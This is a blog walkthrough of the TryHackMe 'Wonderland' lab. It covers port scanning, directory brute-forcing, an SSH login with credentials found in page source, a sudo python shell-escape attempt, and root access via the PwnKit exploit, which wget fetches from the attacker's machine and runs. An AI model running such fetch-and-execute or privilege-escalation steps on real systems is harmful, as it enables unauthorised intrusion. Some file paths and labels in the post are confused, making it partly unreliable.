---
layout: post
title: "TryHackMe: Wonderland"
date: 2025-11-28 23:00:00 +0530
categories: [TryHackMe]
tags: [tryhackme, wonderland, ctf, walkthrough, linux, privilege-escalation, web-enumeration, ssh, hacking, writeup]
render_with_liquid: false
media_subpath: /images/Wonderland/
description: "A walkthrough for the TryHackMe Wonderland room covering web enumeration, SSH access, and privilege escalation to root."
---

# TryHackMe: Wonderland CTF — Writeup | 28 November 2025

<div align="center">
    <img src="THM.png" alt="TryHackMe Logo" width="900"/>
    <img src="Wounderland.png" alt="Room Banner" width="600"/>
</div>

---

## Overview
This room walks you through exploiting a Linux machine themed after "Alice in Wonderland," focusing on web enumeration, SSH access, and privilege escalation. You'll learn to chain together web and local exploits to gain root access.


---

## Reconnaissance & Scanning

### Nmap

Perform a full port and service scan:

```bash
sudo nmap -Pn -T4 -n -sC -sV -p- -oN scan_nmap.txt 10.48.189.255
```

**Scan Summary:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

We got two web services running on ports 80 and 22.
- 22/tcp: OpenSSH 7.6p1
- 80/tcp: Golang net/http server (Go-IPFS json-rpc or InfluxDB API) with title "Follow the white rabbit."

---

## Home Page 
Accessing the web application on port 80, we see a simple page with the title "Follow the white rabbit."
<div align="center">
    <img src="home_page.png" alt="Home Page" width="600"/>
</div>
---

## Web Enumeration
Scan the web application using Gobuster:

```bash
gobuster dir -u http://10.48.189.255/ \
    -w /usr/share/wordlists/dirb/common.txt \ 
    -o dir_results_common.txt -t 25

```
**Gobuster Results:**

```
/img                  (Status: 301) [Size: 0] [--> img/]
/index.html           (Status: 301) [Size: 0] [--> ./]
/r                    (Status: 301) [Size: 0] [--> r/]
```

directories found: /r

<div align="center">
    <img src="r.png" alt="Gobuster Results" width="600"/>
</div>
Nothing much found here.
Now let's scan the /r directory.
```bash
gobuster dir -u http://10.48.189.255/r/ \
    -w /usr/share/wordlists/dirb/common.txt \
    -o dir_results_common_r.txt -t 25
```
**Gobuster Results:**

```
/a                    (Status: 301) [Size: 0] [--> a/]
/index.html           (Status: 301) [Size: 0] [--> ./]
```
directories found: /a
<div align="center">
    <img src="r_a.png" alt="Gobuster Results r/a" width="600"/>
</div>
noting much here either. Let's scan /r/a
```bash
gobuster dir -u http://10.48.189.255/r/a \
    -w /usr/share/wordlists/dirb/common.txt \
    -o dir_results_common_r_a.txt -t 25 
```
**Gobuster Results:**
```
/b                    (Status: 301) [Size: 0] [--> b/]
/index.html           (Status: 301) [Size: 0] [--> ./]
```
directories found: /b
<div align="center">
    <img src="r_a_b.png" alt="Gobuster Results r/a/b" width="600"/>
</div>
Again, nothing much here. Let's scan /r/a/b
```bash
gobuster dir -u http://10.48.189.255/r/a/b/ \
    -w /usr/share/wordlists/dirb/common.txt \
    -o dir_results_common_r_a_b.txt -t 25 
```
**Gobuster Results:**
```
/b                    (Status: 301) [Size: 0] [--> b/]
/index.html           (Status: 301) [Size: 0] [--> ./]
```
directories found: /b
<div align="center">
    <img src="r_a_b_b.png" alt="Gobuster Results r/a/b/b" width="600"/>
</div>
Again, nothing much here. Let's scan /r/a/b/b
```bash
gobuster dir -u http://10.48.189.255/r/a/b/b \
    -w /usr/share/wordlists/dirb/common.txt \
    -o dir_results_common_r_a_b_b.txt -t 25
```
**Gobuster Results:**
```
/i                    (Status: 301) [Size: 0] [--> i/]
/index.html           (Status: 301) [Size: 0] [--> ./]
```
directories found: /i
<div align="center">
    <img src="r_a_b_b_i.png" alt="Gobuster Results r/a/b/b/i" width="600"/>
</div>
Now, let's scan /r/a/b/b/i
```bash
gobuster dir -u http://10.48.189.255/r/a/b/b/i/ \
    -w /usr/share/wordlists/dirb/common.txt \
    -o dir_results_common_r_a_b_b_i.txt -t 25
```
**Gobuster Results:**
```
/index.html           (Status: 301) [Size: 0] [--> ./]
/t                    (Status: 301) [Size: 0] [--> t/]
```
directories found: /t
<div align="center">
    <img src="r_a_b_b_i_t.png" alt="Gobuster Results r/a/b/b/i/t" width="600"/>
</div>
Finally, we got something! and notice that url form rabbit.
In source code of /r/a/b/b/i/t. Username and password is mentioned.
<div align="center">
    <img src="credentials.png" alt="Credentials" width="600"/>
</div>

I think these credentials are for ssh.
try to login via ssh.

```bash
ssh alice@<IP_ADDRESS>
```
<div align="center">
    <img src="ssh_login.png" alt="SSH Login" width="600"/>
</div>
We are in as user alice.
In home directory of alice, we found two things.
```
-rw------- 1 root  root    66 May 25  2020 root.txt
-rw-r--r-- 1 root  root  3577 May 25  2020 walrus_and_the_carpenter.py
```
The walrus_and_the_carpenter.py file seems interesting. Let's check it out.

<div align="center">
    <img src="walrus_code.png" alt="Walrus Code" width="800"/>
</div>
Nothing much interesting in the message.

## Privilege Escalation
Check the sudo permissions for alice.
```
sudo -l
```
- Result:

```bash
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py

```

Trying to run the python SUID command.

```bash
sudo python3.6 -c 'import os; os.system("/bin/sh")'
```
Nothing happened.

Let's try `find` command.
``` bash
find / -perm -4000 -type f 2>/dev/null
```
- Result:
```bash
/usr/bin/pkexec
```
Now let exploit using PwnKit vulnerability.
here is the github link for exploit: https://github.com/ly4k/PwnKit?tab=readme-ov-file
- Download the exploit code using wget.
- To your local machine, compile the exploit:
- using wget download the exploit code to target machine.
```bash
wget <IP_address_your >/PwnKit
```
- Give execute permissions:
```bash
chmod +x PwnKit
```
- Run the exploit:
```bash
./PwnKit
```
- We got root shell!
<div align="center">
    <img src="root_shell.png" alt="Root Shell" width="800"/>
</div>

## Capture the User and Root Flag
- User Flag:
```bash
cat /root/user.txt
```
<div align="center">
    <img src="user_flag.png" alt="User Flag" width="800"/>
</div>

- Root Flag:
```bash
cat /alice/root.txt
```
<div align="center">
    <img src="root_flag.png" alt="Root Flag" width="800"/>
</div>

---


## Room Complete!

<div align="center">
    <img src="completed.png" alt="Completed" width="800"/>
</div>

## Happy Hacking!

<div align="center">
    <img src="https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExM3Nocmo3cWpreDZlbjFuenhsb2o4NW54OHptdjRnY3kxaWZzaGM2OSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/Rpl1sod1vCXK0L2SUN/giphy.gif" alt="Hacking GIF" width="800"/>
</div>
